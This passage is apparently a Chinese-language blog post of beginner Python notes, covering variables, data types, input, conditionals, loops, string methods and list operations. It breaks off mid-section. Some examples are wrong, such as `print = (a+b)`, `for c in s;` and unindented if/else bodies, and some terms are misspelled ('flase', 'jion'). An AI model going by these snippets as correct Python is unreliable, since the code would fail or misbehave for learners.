    <content type="html"><![CDATA[<h1 id="一-注释"><a href="#一-注释" class="headerlink" title="一.注释"></a>一.注释</h1><p>**一.注释</p><p><strong>#（单行注释）</strong>（快捷键：CTRL+&#x2F;)</p><p><strong>…<br>多行注释<br>…</strong></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209104457629.png" alt="image-20231209104457629"></p><h1 id="二-变量"><a href="#二-变量" class="headerlink" title="二.变量"></a>二.变量</h1><p>**变量:可以发生改变的一个量，变量是用来区分不同数据的，可以指向一个内存空间，帮我们存储一些数据<br>**</p><p><strong>变量的命名规范:<br>1.必须是数字或字母或下换线组成，<br>2.不能是数字开头，更不能是纯数字<br>3，不能用python的关键字(if &#x2F;for &#x2F;while &#x2F;break &#x2F;true)<br>4，不要用中文<br>5，不要太长<br>6，要有意义<br>7、推荐使用下换线命名或者驼峰命名（首字母大写）</strong></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209104533315.png" alt="image-20231209104533315"></p><h1 id="三-数据类型"><a href="#三-数据类型" class="headerlink" title="三.数据类型"></a>三.数据类型</h1><p><strong>1、数字: + - * &#x2F;</strong><br><strong>整数，int</strong>—-<strong>加减乘除，大小比较</strong></p><p><strong>小数（浮点数）：float</strong> </p><p>list(列表) tuple(元组) dict(字典)</p><p>  type() 函数可以查看变量的数据类型</p><p>**2、文字: **</p><p><strong>字符串: str</strong></p><p><strong>表示方式:</strong></p><p><strong>操作:左右两端必须是字符串，表示字符串连接操作一个字符串只能乘以一个数字，表示字符串重复的次数</strong></p><p><strong>3、布尔(bool): 条件判断布尔值主要有两个:</strong><br><strong>True 真，真命题</strong></p><p><strong>flase假，假命题</strong></p><p><strong>4.list(列表) tuple(元组) dict(字典)<br>5.type() 函数可以查看变量的数据类型</strong></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209144056526.png" alt="image-20231209144056526"></p><p><strong>6.基础数据类型的转换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = &quot;10&quot;</span><br><span class="line"></span><br><span class="line">print(type(a))</span><br><span class="line"></span><br><span class="line">b = str(a)</span><br><span class="line"></span><br><span class="line">print(type(b))</span><br></pre></td></tr></table></figure><h1 id="四-用户交互"><a href="#四-用户交互" class="headerlink" title="四.用户交互"></a>四.用户交互</h1><p><strong>变量 &#x3D; input(提示语)</strong></p><p><strong>首先会在屏幕中显示出提示语，用户输入内容，然后把用户输入的内容交给前面的变量</strong></p><p> <strong>坑: input()</strong></p><p><strong>得到的结果一定是字符串，怎么把字符串转化成数字类型</strong></p><p><strong>py基础数据类型:想把xxx转化成谁，就用谁套起来</strong><br><strong>str &#x3D;&gt; int int(str)</strong></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209144219320.png" alt="image-20231209144219320"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(a)</span><br><span class="line"></span><br><span class="line">b =<span class="built_in">int</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> = (a+b)</span><br></pre></td></tr></table></figure><h1 id="五、条件判断"><a href="#五、条件判断" class="headerlink" title="五、条件判断"></a>五、条件判断</h1><h4 id="1-if语句的语法规则"><a href="#1-if语句的语法规则" class="headerlink" title="1.if语句的语法规则:"></a>1.<strong>if语句的语法规则:</strong></h4><p><strong>if 条件:代码如果条件成立就执行</strong></p><p> <strong>代码如果不成立，就不执行</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">money = <span class="number">100</span></span><br><span class="line"><span class="keyword">if</span> money &gt;<span class="number">200</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;去洗脚&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;回家&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-if-else"><a href="#2-if-else" class="headerlink" title="2. if else"></a>2. if else</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>条件:</span><br><span class="line">    代码<span class="number">1</span></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    代码<span class="number">2</span></span><br><span class="line">如果条件成立，执行代码<span class="number">1</span>，否则，执行代码<span class="number">2</span></span><br><span class="line">money = <span class="built_in">input</span>(<span class="string">&quot;请输入你口袋里面的钱:&quot;</span>)</span><br><span class="line">money = <span class="built_in">int</span>(money)</span><br><span class="line"><span class="keyword">if</span> money &gt; <span class="number">1000</span>:</span><br><span class="line">    <span class="keyword">if</span> money&gt;<span class="number">5000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;冲个会员卡&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;洗个脚&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;回家&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="3-if-elif-else"><a href="#3-if-elif-else" class="headerlink" title="3.if elif else"></a>3.if elif else</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> 判断条件<span class="number">1</span>:</span><br><span class="line">   判断条件<span class="number">1</span>成立,执行的代码</span><br><span class="line"><span class="keyword">elif</span> 判断条件<span class="number">2</span>:</span><br><span class="line">   判断条件<span class="number">1</span>不成立,判断条件<span class="number">2</span> 成立,会执行的代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   判断条件<span class="number">1</span>和判断条件<span class="number">2</span>都不成立,执行的代码</span><br><span class="line">   </span><br><span class="line">-------</span><br><span class="line">money = <span class="built_in">input</span>(<span class="string">&quot;请输入你口袋里面的钱:&quot;</span>)</span><br><span class="line">money = <span class="built_in">int</span>(money)</span><br><span class="line"><span class="keyword">if</span> money &gt; <span class="number">5000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;冲个卡&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> money &gt; <span class="number">1000</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;洗脚&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;回家洗洗睡&quot;</span>)</span><br></pre></td></tr></table></figure><p>4.if 嵌套</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 判断条件<span class="number">1</span>:</span><br><span class="line">   判断条件<span class="number">1</span> 成立,会执行的代码</span><br><span class="line">   <span class="keyword">if</span> 判断条件<span class="number">2</span>:</span><br><span class="line">       判断条件<span class="number">1</span>成立, 判断条件<span class="number">2</span>成立执行的代码</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       判断条件<span class="number">1</span>成立, 判断条件<span class="number">2</span>不成立执行的代码</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   判断条件<span class="number">1</span>不成立,会执行的代码 </span><br></pre></td></tr></table></figure><p>（6）三目运算</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">else</span> 结构变形</span><br><span class="line"><span class="keyword">if</span> 判断条件<span class="number">1</span>:</span><br><span class="line">   表达式<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   表达式<span class="number">2</span></span><br><span class="line"></span><br><span class="line">判断条件成立,执行表达式 <span class="number">1</span>, 条件不成立,执行表达式 <span class="number">2</span></span><br><span class="line"></span><br><span class="line">变量 = 表达式<span class="number">1</span> <span class="keyword">if</span> 判断条件 <span class="keyword">else</span> 表达式<span class="number">2</span>   推荐使用扁平化代码</span><br><span class="line"></span><br><span class="line">变量最终存储的结构是: </span><br><span class="line">   判断条件成立,表达式<span class="number">1</span>的值, </span><br><span class="line">   条件不成立,表达式<span class="number">2</span>的值</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209150556122.png" alt="image-20231209150556122"></p><h4 id="4-for循环"><a href="#4-for循环" class="headerlink" title="4.for循环"></a>4.for循环</h4><p><strong>for 变量 in 可迭代的东西:</strong><br><strong>把可迭代的东西中的每项内容拿出来。 挨个的赋值给变量，每一次赋值都要执行一 次循环体(代码)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;你好啊，我叫哈哈哈&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这一次循环得到的是:&quot;</span>,c)</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209150655558.png" alt="image-20231209150655558"></p><p><strong>for循环想要计数,必须借助于 range</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):  <span class="comment">#输出3-9</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10</span>,<span class="number">2</span>):    <span class="comment">#输出结果是1 3 5 7 9</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h1 id="六、字符串"><a href="#六、字符串" class="headerlink" title="六、字符串"></a>六、字符串</h1><h3 id="1、字符串的格式化问题"><a href="#1、字符串的格式化问题" class="headerlink" title="1、字符串的格式化问题"></a>1、字符串的格式化问题</h3><p><strong>f-strir</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入你的名字:&quot;</span>)</span><br><span class="line"></span><br><span class="line">address = <span class="built_in">input</span>(<span class="string">&quot;请输入你的住址:&quot;</span>)</span><br><span class="line"></span><br><span class="line">age = <span class="built_in">input</span>(<span class="string">&quot;请输入你的年龄:&quot;</span>)</span><br><span class="line"></span><br><span class="line">hobby = <span class="built_in">input</span>(<span class="string">&quot;请输入你的爱好:&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">f&quot;我叫<span class="subst">&#123;name&#125;</span>，我住在<span class="subst">&#123;address&#125;</span>,我今年<span class="subst">&#123;age&#125;</span>，我的爱好是<span class="subst">&#123;hobby&#125;</span>&quot;</span>   <span class="comment"># f-strir</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231209151241748.png" alt="image-20231209151241748"></p><h3 id="2、字符串的常规操作"><a href="#2、字符串的常规操作" class="headerlink" title="2、字符串的常规操作"></a>2、字符串的常规操作</h3><h4 id="2-1字符串大小写转换"><a href="#2-1字符串大小写转换" class="headerlink" title="2.1字符串大小写转换"></a>2.1字符串大小写转换</h4><p><strong>单词的首字母大写（title）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;I have a dream!&quot;</span></span><br><span class="line"></span><br><span class="line">s1= s.title() <span class="comment">#单词的首字母大写 </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure><p><strong>变成小写字母(lower)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;I HAVE A DREAM&quot;</span></span><br><span class="line"></span><br><span class="line">s1 = s.lower()<span class="comment">#  全部变成小写字母</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure><p><strong>把所有字母变成大写字母(upper)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;I have a dream!&quot;</span></span><br><span class="line"></span><br><span class="line">s1= s.upper()  <span class="comment">#所有字母变成大写字母</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s1)</span><br></pre></td></tr></table></figure><p><strong>如何忽略大小写来进行验证(upper)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">verify_code = <span class="string">&quot;xAd1&quot;</span></span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span> (<span class="string">f&quot;请输入正确的验证码<span class="subst">&#123;verify_code&#125;</span>:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> verify_code.upper() == user_input.upper():</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;验证码正确&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;验证码错误&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-2替换和切割"><a href="#2-2替换和切割" class="headerlink" title="2.2替换和切割"></a>2.2替换和切割</h4><p><strong>2.2-1替换</strong><br><strong>strip() #去掉字符串左右两端的空白符(空格，\t, |n)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;       你好    ,  我叫     周杰伦     &quot;</span></span><br><span class="line">s1 = s.strip( )</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#案例</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="/python.assets/image-20231213203844495.png" alt="image-20231213203844495"></p><p><strong>replace(old,new)字符串替换</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;你好啊，我叫赛利亚&quot;</span></span><br><span class="line">s1 = s.replace(<span class="string">&quot;赛利亚&quot;</span>,<span class="string">&quot;luyuguo&quot;</span> )</span><br><span class="line"><span class="built_in">print</span>(s1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#案例</span></span><br><span class="line">a =<span class="string">&quot;hello i am good man!&quot;</span></span><br><span class="line">a1 = a.replace(<span class="string">&quot;good&quot;</span>,<span class="string">&quot;bad&quot;</span>) </span><br><span class="line"><span class="built_in">print</span>(a1)</span><br></pre></td></tr></table></figure><p><img src="/python.assets/image-20231213204244876.png" alt="image-20231213204244876"></p><p><strong>2.2-2 切割</strong></p><p><strong>split(用什么切割)字符串切割，用什么切，就会损失掉谁</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a= <span class="string">&quot;python_ java_.c_c#_ javascript&quot;</span></span><br><span class="line">lst = a.split(<span class="string">&quot;_&quot;</span>)  <span class="comment">#切割之后的结果会放在列表当中</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line">a= <span class="string">&quot;python_ java_.c_c#_ javascript&quot;</span></span><br><span class="line">lst1 = a.split(<span class="string">&quot; java &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>( lst1)</span><br></pre></td></tr></table></figure><p><img src="/python.assets/image-20231213204734862.png" alt="image-20231213204734862"></p><p><strong>与切割相反的命令 jion()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&#x27;赵本山&#x27;</span>,<span class="string">&#x27;王大拿&#x27;</span>,<span class="string">&#x27;大张伟&#x27;</span>,<span class="string">&#x27;马大哈&#x27;</span>]  <span class="comment">#用把上面的人的名字连起来</span></span><br><span class="line">s = <span class="string">&quot;_&quot;</span>.join(lst)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><h4 id="2-3-查找和判断"><a href="#2-3-查找和判断" class="headerlink" title="2.3 查找和判断"></a>2.3 查找和判断</h4><p><strong>2.3-1 查找（find index )</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;你好啊,我叫周润发&quot;</span></span><br><span class="line">ret = s.find(<span class="string">&quot;周润发12312&quot;</span>) <span class="comment">#返回如果是-1就是没有该字符串出现</span></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line">s = <span class="string">&quot;你好啊,我叫周润发&quot;</span></span><br><span class="line">ret = s.index (<span class="string">&quot;周润发12312&quot;</span>)  <span class="comment">#如果报错就是没有</span></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line">s = <span class="string">&quot;你好啊,我叫周润发&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;周润发&quot;</span> <span class="keyword">in</span> s)  <span class="comment">#in可以做条件上的判断</span></span><br><span class="line">s = <span class="string">&quot;你好啊,我叫周润发&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;周润发&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> s)  <span class="comment">#not in判断是否不存在</span></span><br></pre></td></tr></table></figure><p><strong>2.3-2 判断</strong></p><p><strong>.startswith</strong> <strong>endswith()</strong> <strong>isdigit()</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;请输入你的名字:&quot;</span>)   <span class="comment">#判断你是不是姓张</span></span><br><span class="line"><span class="keyword">if</span> name.startswith(<span class="string">&quot;张&quot;</span>):       <span class="comment">#判断字符串是否以xxxx开头， endswith()</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;你姓张&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;不姓张&quot;</span>)</span><br><span class="line">money = <span class="built_in">input</span>(<span class="string">&quot;请输入你兜里的钱:&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> money.isdigit(): <span class="comment"># 判断字符串是否由整数组成。</span></span><br><span class="line">    money = <span class="built_in">int</span>(money)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;可以花钱了&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;对不起,您输入有误....&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h4><p><strong>1、f”{变量}” 格式化一个字符串</strong></p><p><strong>2、索引和切片:</strong></p><p> <strong>索引:从0开始的，[ ]</strong></p><p> <strong>切片: s[start: end: step], end位置的数据永远拿不到相关操作:</strong></p><p><strong>3、字符串操作对原字符串是不发生改变的.</strong></p><p><strong>upper() 在需要忽略大小写的时候</strong></p><p><strong>strip() 可以去掉字符串左右两端的空白(空格，\t, \n)</strong></p><p><strong>replace() 字符串替换</strong></p><p><strong>split() 对字符串进行切割</strong></p><p><strong>join() 拼接一个列表中的内容成为新字符串</strong></p><p><strong>startswith() 判断字符串是否以xxx开头</strong></p><p><strong>len() 字符串长度(内置函数)</strong></p><p><strong>字符串的循环和遍历</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s;</span><br><span class="line"></span><br><span class="line">​<span class="built_in">print</span>(c)  <span class="comment">#字符串的每一个字符</span></span><br></pre></td></tr></table></figure><p><strong>关于in：</strong></p><p><strong>判断xxx是否在xxxx中出现了</strong><br><strong>for循环</strong></p><h1 id="七、列表"><a href="#七、列表" class="headerlink" title="七、列表"></a>七、列表</h1><h3 id="1、定义"><a href="#1、定义" class="headerlink" title="1、定义:"></a>1、定义:</h3><p><strong>能装东西的东西</strong></p><p><strong>在python中用[ ]来表示一个列表。列表中的元素通过 , 号隔开</strong></p><p><strong>a &#x3D;[“张三丰”，”张无忌”，“张绍刚”， [1,2,3,True, ] ]</strong></p><p><strong>特性:</strong><br><strong>1.也像字符串一样也有索引和切片</strong><br><strong>2.索引如果超过范围会报错</strong><br><strong>3.可以用for循环进行遍历</strong><br><strong>4.用len可以拿到列表的长度</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lst[<span class="number">1</span>] ) </span><br><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(lst[<span class="number">1</span>:<span class="number">3</span>] ) <span class="comment">#输出陆小果和张无忌</span></span><br><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(lst) )   <span class="comment">#输出列表中有几个元素</span></span><br></pre></td></tr></table></figure><h3 id="2、列表的增删改查"><a href="#2、列表的增删改查" class="headerlink" title="2、列表的增删改查"></a>2、列表的增删改查</h3><h4 id="A、增加"><a href="#A、增加" class="headerlink" title="A、增加"></a>A、增加</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [ ]</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h5 id="向列表中添加内容-append"><a href="#向列表中添加内容-append" class="headerlink" title="向列表中添加内容(append)"></a>向列表中添加内容(append)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line">lst.append(<span class="string">&quot;输入内容&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h5 id="向列表中定向插入内容-insert"><a href="#向列表中定向插入内容-insert" class="headerlink" title="向列表中定向插入内容(insert)"></a>向列表中定向插入内容(insert)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line">lst.insert(<span class="number">0</span>,<span class="string">&quot;luyuguo&quot;</span>)  <span class="comment">#向0号位添加luyuguo</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h5 id="合并列表-extend"><a href="#合并列表-extend" class="headerlink" title="合并列表(extend)"></a>合并列表(extend)</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line">lst.extend([<span class="string">&quot;111&quot;</span>,<span class="string">&quot;222&quot;</span>,<span class="string">&quot;333&quot;</span>])  <span class="comment">#可以合并两个列表，批量添加内容</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h4 id="B、删除-remove"><a href="#B、删除-remove" class="headerlink" title="B、删除(remove)"></a>B、删除(remove)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>,<span class="string">&quot;111&quot;</span>]</span><br><span class="line">lst.remove(<span class="string">&quot;111&quot;</span>)  <span class="comment">#删除元素111</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h4 id="C、修改"><a href="#C、修改" class="headerlink" title="C、修改"></a>C、修改</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line">lst[<span class="number">3</span>] = <span class="string">&quot;111&quot;</span> <span class="comment">#直接使用索引就可以进行修改</span></span><br><span class="line"><span class="built_in">print</span>(lst)</span><br></pre></td></tr></table></figure><h4 id="D、查询"><a href="#D、查询" class="headerlink" title="D、查询"></a>D、查询</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lst = [<span class="string">&quot;金毛狮王&quot;</span>,<span class="string">&quot;陆小果&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;赵敏&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(lst[<span class="number">3</span>])  <span 